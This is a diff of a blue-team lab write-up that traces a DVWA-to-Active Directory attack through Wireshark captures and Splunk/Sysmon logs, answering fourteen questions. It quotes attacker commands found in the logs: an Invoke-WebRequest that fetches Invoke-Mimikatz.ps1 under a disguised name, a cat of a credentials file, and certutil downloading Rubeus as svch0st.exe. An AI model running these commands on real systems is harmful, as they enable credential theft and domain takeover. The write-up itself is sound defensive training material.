@@ -31,25 +31,24 @@ After starting the Splunk process, it was observed running on the loopback addre
 
 Before investigating logs, I performed a data summary in Splunk to understand what sources were ingested. The environment contained Windows Event Logs and Sysmon logs.
 
+<img width="1719" height="692" alt="image" src="https://github.com/user-attachments/assets/25cdc731-6751-419b-a0a4-eae419b89b67" />
+
+
 I then analyzed the packet capture in Wireshark and filtered traffic going to port 80:
 
 tcp.port == 80
 
-vbnet
-Copy code
+<img width="2823" height="1256" alt="image" src="https://github.com/user-attachments/assets/caa24203-abc7-4f02-b291-0c0302bab298" />
+
 
 Multiple requests were sent to `192.168.1.12`. Following the TCP stream revealed the DVWA login page hosted on the webserver. The attacker logged in using default credentials:
 
 admin : password
 
-yaml
-Copy code
+<img width="2870" height="1398" alt="image" src="https://github.com/user-attachments/assets/fa136340-d15d-4b66-8d24-f70478606530" />
+
 
 This was a clear misconfiguration.
-
-📸 *Screenshot added here*
-
----
 
 ### ❓ Q2) What is the IP of the attacker machine while interacting with the webserver?
 
@@ -57,159 +56,116 @@ The attacker’s IP address while interacting with the webserver was:
 
 192.168.1.13
 
-yaml
-Copy code
+<img width="2823" height="1256" alt="image" src="https://github.com/user-attachments/assets/a9ea4281-b827-4dd0-bab7-35ad91793224" />
 
-📸 *Screenshot added here*
-
----
 
 ### ❓ Q3) The attacker was able to execute commands on the webserver. How many commands were executed?
 
 **Answer:** 6  
 
-This was determined by reviewing POST requests sent to:
+This was determined by reviewing POST requests sent to the webserver ( POST /dvwa/vulnerabilities/exec/ ). It seemed like the attacker tried to upload some commands in through an upload field in the webserver.
 
-POST /dvwa/vulnerabilities/exec/
-
-yaml
-Copy code
-
-📸 *Screenshot added here*
-
----
+<img width="2877" height="1235" alt="image" src="https://github.com/user-attachments/assets/3a49262c-28dc-41d3-a0a5-ca15db97bf02" />
 
 ### ❓ Q4) The attacker found a useful file on the webserver. What is the name of the file?
-
-The attacker gained a foothold and began listing hidden files in `/var/www/dvwa/`.
-
+For this one by analyzing all those post request we found that the attacker gained a foothold and began listing hidden files in `/var/www/dvwa/`.Then he found .credentials.txt and tried to open it with:
 cat /var/www/dvwa/.credentials.txt
 
-yaml
-Copy code
+<img width="2796" height="1331" alt="image" src="https://github.com/user-attachments/assets/30081a26-ef6e-4396-a98e-6994252e636c" />
 
-📸 *Screenshot added here*
-
----
 
 ### ❓ Q5) What important data is present inside the file?
 
 Following the TCP stream showed the sensitive data returned in the webserver response.
 
-📸 *Screenshot added here*
-
----
+<img width="2871" height="1515" alt="image" src="https://github.com/user-attachments/assets/9f107b79-c4f2-4d07-a0d3-5bd0694b966a" />
 
 ### ❓ Q6) What internal network subnet did the attacker discover and scan?
 
 Using the filter:
-
-ip.dst == 192.168.1.12 && ip.src == 192.168.1.13
-
-yaml
-Copy code
-
+Looking at the last POST request in the conversatons(
+ip.dst == 192.168.1.12 && ip.src == 192.168.1.13) we can see the nmap scan to the subnet.
 The scan targeted:
 
 10.0.2.0/24
 
-yaml
-Copy code
+<img width="2867" height="1395" alt="image" src="https://github.com/user-attachments/assets/cbab008f-2d86-46f0-a465-0a9ce03c939a" />
 
-📸 *Screenshot added here*
-
----
 
 ### ❓ Q7) Using Splunk, what is the domain name of the AD environment?
 
 Starting with a broad search:
-
 index=*
 
-yaml
-Copy code
+<img width="2849" height="1277" alt="image" src="https://github.com/user-attachments/assets/5769b83f-e066-4cae-9057-c81622cf360c" />
+
 
 Reviewing the **account domain** field revealed the Active Directory domain name.
 
-📸 *Screenshot added here*
+<img width="2868" height="1526" alt="image" src="https://github.com/user-attachments/assets/0abac505-14dc-4a08-a4f3-1b3abfe4971e" />
 
----
 
 ### ❓ Q8) A user account “mtyson” downloaded files onto one of the systems. What system was it?
+Looking into the user account "mtyson", we observed two computer used by this account
+<img width="2859" height="1122" alt="image" src="https://github.com/user-attachments/assets/9e71cf73-5bcf-4c21-8de2-1d8f32902d5b" />
 
 PowerShell activity was observed on the second system. The first system only showed system login events.
 
-📸 *Screenshot added here*
+<img width="2837" height="1166" alt="image" src="https://github.com/user-attachments/assets/2e1b4582-af9f-40ef-bff6-283e26dc8193" />
 
----
+<img width="2840" height="1161" alt="image" src="https://github.com/user-attachments/assets/ed306bd8-2b81-4a46-b90e-18ddb0f38bb8" />
 
 ### ❓ Q9) What is the first file downloaded onto the system?  
 **(Format: ActualName, GivenName)**
-
-Sysmon Event ID 1 showed PowerShell executing:
+I looked into sysmon logs with the computer name and the hostname and found a process creation Sysmon Event ID 1 that showed PowerShell executing:
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Troubleshoot.ps1
 
-makefile
-Copy code
+<img width="2870" height="1130" alt="image" src="https://github.com/user-attachments/assets/2c64e9f8-4f02-46b1-872b-0e82fb6eebe4" />
+
 
 **Answer:**
 Invoke-Mimikatz.ps1, Troubleshoot.ps1
 
-yaml
-Copy code
-
-📸 *Screenshot added here*
-
----
-
 ### ❓ Q10) What one-liner command was used to dump credentials?
+
+For that one I used the search query: 
+
+<img width="2852" height="522" alt="image" src="https://github.com/user-attachments/assets/3d92cef4-a542-49eb-ace5-b0639dc0ff5e" />
+
 
 Reviewing commands executed from `Troubleshoot.ps1` revealed the credential-dumping command.
 
-📸 *Screenshot added here*
+<img width="2850" height="1185" alt="image" src="https://github.com/user-attachments/assets/1d4e35f7-1eca-47d0-b3a6-760909dd8a34" />
 
----
 
 ### ❓ Q11) The attacker downloaded a compiled binary under a legitimate-looking name. What was it saved as?
-
-`certutil.exe` was used to download **rubeus.exe**, which was renamed to:
+Using the same search, I looked into the commandline to see any file other than msedge or maybe powershell that call out to download a file and rename it and I found that `certutil.exe` was used to download **rubeus.exe**, which was renamed to:
 
 svch0st.exe
 
-yaml
-Copy code
-
-📸 *Screenshot added here*
-
----
+<img width="2864" height="1409" alt="image" src="https://github.com/user-attachments/assets/4953206f-d80f-47b1-9209-1f0968348474" />
 
 ### ❓ Q12) What ticket was used for the pass-the-ticket attack?
 
 0-60a10000-mtyson@krbtgt~HIGHLYSECURED.TECH-HIGHLYSECURED.TECH.kirbi
 
-yaml
-Copy code
+We can see the ptt which stands for pass the ticket.
 
-📸 *Screenshot added here*
+<img width="2084" height="843" alt="image" src="https://github.com/user-attachments/assets/97757b8d-d8a4-4217-b50f-37c59f5b45b7" />
 
----
 
 ### ❓ Q13) What technique was used to achieve domain-wide compromise?
+We can see that the attacker performed a **Golden Ticket** attack.
 
-The attacker performed a **Golden Ticket** attack.
-
-📸 *Screenshot added here*
-
----
+(Command is in the last screenshot)
 
 ### ❓ Q14) What command was used to perform the attack?
 
-The command was identified from the logs.
+The command was identified from the logs, right next to the first ptt attack.
 
-📸 *Screenshot added here*
+<img width="2813" height="732" alt="image" src="https://github.com/user-attachments/assets/34156394-fc7d-4e8c-888a-d5c4ff4c2269" />
 
----
 
 ### 🏁 Conclusion
 
